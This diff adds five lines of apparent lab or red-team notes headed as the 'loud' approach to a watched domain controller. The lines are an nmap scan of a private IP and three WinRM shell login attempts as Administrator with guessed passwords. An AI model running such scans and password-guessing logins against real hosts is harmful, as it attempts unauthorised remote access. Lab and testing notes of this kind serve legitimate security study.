@@ -1,0 +1,5 @@
+## the LOUD way against the watched domain controller
+nmap -sV -p 1-1000 10.10.9.10
+winrm-shell -i 10.10.9.10 -u Administrator -p guess1
+winrm-shell -i 10.10.9.10 -u Administrator -p guess2
+winrm-shell -i 10.10.9.10 -u Administrator -p guess3
